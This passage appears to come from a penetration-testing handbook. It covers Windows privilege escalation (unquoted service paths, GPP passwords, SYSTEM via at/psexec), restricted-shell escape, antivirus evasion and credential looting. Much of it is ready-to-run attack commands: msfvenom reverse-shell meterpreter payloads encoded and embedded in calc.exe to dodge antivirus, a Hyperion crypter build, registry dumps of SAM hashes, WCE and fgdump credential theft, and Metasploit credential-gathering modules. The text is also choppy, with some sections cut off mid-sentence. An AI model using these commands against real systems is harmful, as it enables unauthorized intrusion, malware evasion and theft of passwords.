Unquoted Service Paths
Find Services With Unquoted Paths
# Using WMIC
wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v """
# Using sc
sc query
sc qc service name
# Look for Binary_path_name and see if it is unquoted.
If the path contains a space and is not quoted, the service is vulnerable.
Exploit It
If the path to the binary is:
c:\Program Files\something\winamp.exe
We can place a binary like this
c:\program.exe
When the program is restarted it will execute the binary program.exe, which we of course control.
We can do this in any directory that has a space in its name. Not only program files.
This attack is explained here:
http://toshellandback.com/2015/11/24/ms-priv-esc/
There is also a metasploit module for this is: exploit/windows/local/trusted_service_path
Vulnerable Drivers
Some driver might be vulnerable. I don't know how to check this in an efficient way.

Group Policy Preference
If the machine belongs to a domain and your user has access to System Volume Information
there might be some sensitive files there.
First we need to map/mount that drive. In order to do that we need to know the IP-address of the
domain controller. We can just look in the environment-variables
# Output environment-variables
set
# Look for the following:
LOGONSERVER=\\NAMEOFSERVER
USERDNSDOMAIN=WHATEVER.LOCAL
# Look up ip-addres
nslookup nameofserver.whatever.local
# It will output something like this
Address: 192.168.1.101
# Now we mount it
net use z: \\192.168.1.101\SYSVOL
# And enter it
z:
# Now we search for the groups.xml file
dir Groups.xml /s
If we find the file with a password in it, we can decrypt it like this in Kali
gpp-decrypt encryptedpassword
Services\Services.xml: Element-Specific Attributes
ScheduledTasks\ScheduledTasks.xml: Task Inner Element, TaskV2 Inner Element, ImmediateTaskV2 Inner Element
Printers\Printers.xml: SharedPrinter Element

Escalate to SYSTEM from Administrator
On Windows XP and Older
If you have a GUI with a user that is included in Administrators group you first need to open up
192
Privilege Escalation - Windows
cmd.exe for the administrator. If you open up the cmd that is in Accessories it will be opened up as
a normal user. And if you rightclick and do Run as Administrator you might need to know the
Administrators password. Which you might not know. So instead you open up the cmd from
c:\windows\system32\cmd.exe. This will give you a cmd with Administrators rights.
From here we want to become SYSTEM user. To do this we run:
First we check what time it is on the local machine:
time
# Now we set the time we want the system CMD to start. Probably one minuter after the time.
at 01:23 /interactive cmd.exe
And then the cmd with SYSTEM privs pops up.
Vista and Newer
You first need to upload PsExec.exe and then you run:
psexec -i -s cmd.exe
Kitrap
On some machines the at 20:20 trick does not work. It never works on Windows 2003 for
example. Instead you can use Kitrap. Upload both files and execute vdmaillowed.exe. I think it
only works with GUI.
vdmallowed.exe
vdmexploit.dll
Using Metasploit
So if you have a metasploit meterpreter session going you can run getsystem.
Post modules
Some interesting metasploit post-modules
First you need to background the meterpreter shell and then you just run the post modules.
You can also try some different post modules.
use exploit/windows/local/service_permissions
post/windows/gather/credentials/gpp
run post/windows/gather/credential_collector
run post/multi/recon/local_exploit_suggester
run post/windows/gather/enum_shares

Escaping Restricted Shell
Escaping Restricted Shell
Some sysadmins don't want their users to have access to all commands. So they get a restriced shell.
If the hacker get access to a user with a restriced shell we need to be able to break out of that, escape
it, in order to have more power.
Many linux distros include rshell, which is a restriced shell.
To access the restried shell you can do this:
sh -r
rsh
rbash
bash -r
bash --restricted
rksh
ksh -r

Bypassing antivirus
Bypassing antivirus
Bypassing antivirus
So first of all, what is a antivirus program and how does it work?
How does it work?
Antivirus normally uses blacklisting as their methodology. They have a huge database full of
signatures for different known malware. Then the antivirus just scans the disk and search for any of
those signatures.
How do we bypass it?
So since there are many different antivirus and they all have different databases of signatures it is
important for us to know what antivirus our target uses. Once we know that we can use
virtustotal.com to upload our malicious files to see if that specific antivirus finds it.
So what we need to do is to change the malware enough so that the signature changes and the
antivirus is not able to identify the file as malicious.
There are a few different techniques for doing this.
Encoding
We can encode our malware in different ways. This can be done with msfvenom. Notice how we set
the -e flag here, and then use the shikata_ga_nai encoding. This is not that effective since
antivirus-vendors have access to metasploit as well.
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.101 LPORT=5555 -f exe -e
x86/shikata_ga_nai -i 9 -o meterpreter_encoded.exe
Embed in non-malicious file
Another way is to embed our payload in a non-malicious file.
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.101 LPORT=5555 -f exe -e
x86/shikata_ga_nai -i 9 -x calc.exe -o
bad_calc.exe
Encrypting the malware
In order to obfuscate our malware we can encrypt it, and thus radically changing the signature. One
much mentioned tool for doing that is Hyperion. It is a windows binary but we can compile and run it
from linux as well. This worked for me (october 2016)
wget https://github.com/nullsecuritynet/tools/raw/master/binary/hyperion/release/Hyperion-1.2.zip
unzip Hyperion-1.2.zip
i686-w64-mingw32-c++ Hyperion-1.2/Src/Crypter/*.cpp -o hyperion.exe
197
Bypassing antivirus
In Kali you have hyperion 1 included. However for it to work you have to run it from it's correct path.
So go to /usr/share/veil-evasion/tools/hyperion
And run it like this
wine hyperion /path/to/file.exe encryptedfile.exe

Loot and Enumerate
Loot and Enumerate
Loot and Enumerate
After you have gained access to a machine you must loot it. This is useful in order to be able to pivot
into other machine.
If you are on a network with other machines that you still haven't owned, it might be useful to take a
tcp-dump from the machine you have owned. So that you can inspect the traffic between that machine
and the other machines on the network. This might be helpful when attacking the other machines.
So after we have exploited a machine we want to use that machine to learn as much about the network
as possible. To be able to map the entire network. We want to know about switches, firewalls, routers,
other computers, server, etc. We want to know what ports are open, their operating systems.
We can start getting an understanding of the network by taking a tcp-dump.
We also want to look for password that might be reused on other machines, and sensitive information
found in databases. Information about the user might be interesting in order to use social engineering
attacks against other users in the network.

Meterpreter
If you have a meterpreter shell you are able to do a lot of thing with very little effort. If you do not
have a meterpreter-shell you can always create a exploit with msfvenom. An elf or exe or other

Dumping passwords and hashes on windows
This most likely requires administrative rights, that's why the chapter is found here and not in priv-
esc. Once you have a hash you can move on to the Password Cracking-chapter where we discuss
different techniques of cracking hashes.
Windows stores passwords in SAM - Security Account Manager. Passwords are stored differently
depending on the operating system. Up until (and including) Windows 2003 stored the passwords in
LAN Manager (LM) and NT LAN Manager (NTLM). LM is incredibly insecure. From windows vista
and on the system does not use LM, only NTLM. So it is a bit more secure.
LM and NTLM >= Windows 2003
NTLM > Windows vista
LM Hashes
LM hashes can be really easy to crack. The LM part in the example below is the first part.

Loot Windows

Example of NT
Administrator:500:NO PASSWORD*********************:BE134K40129560B46534340292AF4E72:::
fgdump.exe
We can use fgdump.exe (locate fgdump.exe on kali) to extract NTLM and LM Password
hashes. Run it and there is a file called 127.0.0.1.pwndump where the hash is saved. Now you can try
to brute force it.
Windows Credencial Editor (WCE)
WCE can steal NTLM passwords from memory in cleartext! There are different versions of WCE,
one for 32 bit systems and one for 64 bit. So make sure you have the right one.
You can run it like this
wce32.exe -w
Loot registry without tools
This might be a better technique than using tools like wce and fgdump, since you don't have to upload
any binaries. Get the registry:
C:\> reg.exe save hklm\sam c:\windows\temp\sam.save
C:\> reg.exe save hklm\security c:\windows\temp\security.save
C:\> reg.exe save hklm\system c:\windows\temp\system.save
The hashes can be extracted using secretdump.py or pwdump
Pwdump 7
http://www.tarasco.org/security/pwdump_7/
VNC
VNC require a specific password to log in to. So it is not the same password as the user password. If
you have a meterpreter shell you can run the post exploit module to get the VNC password.

use post/windows/gather/credentials/vnc

Tcp-dump on winfows
You can use meterpreter to easily take a tcp-dump, like this:

Tcp-dump
Fast command:
tcpdump -i any -s0 -w capture.pcap
tcpdump -i eth0 -w capture -n -U -s 0 src not 192.168.1.X and dst not 192.168.1.X
tcpdump -vv -i eth0 src not 192.168.1.X and dst not 192.168.1.X
First we need to figure out what interfaces the machine is using: ifconfig. Then we can just start
tapping in on that and start to capture those packets.
Commands and flags
203
Loot Linux
Let's start with the basics. tcpdump - this command will output all network traffic straight to the
terminal. Might be hard to understand if there is a lot of traffic.
-A - stands for Ascii, and output it in ascii.
-w file.pcap - the w-flag will save the output into the filename of your choice. The traffic is
stored in pcap-format, which is the standard packet-analysis-format.
-i any - will capture traffic for all interfaces.
-D - show list of all interfaces
-q - be less verbose. Be more quiet
-s - The default size that tcpdump captures is only 96 bytes. If you want it to capture more you have
to define it yourself -s0 gives you the whole packet.
-c - count. Set how many packets you want to intercept. And then stop. Is useful if you have a non-
interactive shell, this way to can capture packets without having to leave with ctr-c.
port 22 - only see traffic on a specific port.
-vvv - Verbose. Depending on how verbose you want the output.
Useful commands
Lots of good stuff here http://www.rationallyparanoid.com/articles/tcpdump.html
tcpdump -i wlan0 -vvv -A | grep "GET"
This will grep all GET from the wlan0 interface. This will not get any SSL-encrypted traffic.
sudo tcpdump -i wlan0 src port 80 or dst port 80 -w port-80-recording.pcap
sudo tcpdump -i eth0 src port 80 or dst port 80 -w port-80-recording.pcap
Print the traffic in hex with ascii interpretation.
tcpdump -nX -r file.pcap
Only record tcp-traffic
tcpdump tcp -w file.pcap
Sniffing for passwords
Once we have dumped some of the traffic we can insert it into metasploit and run psnuffle on it. It
can sniff passwords and usernames from pop3, imap, ftp, and HTTP GET. This is a really easy way
to find usernames and passwords from traffic that you have already dumped, or are in the process of
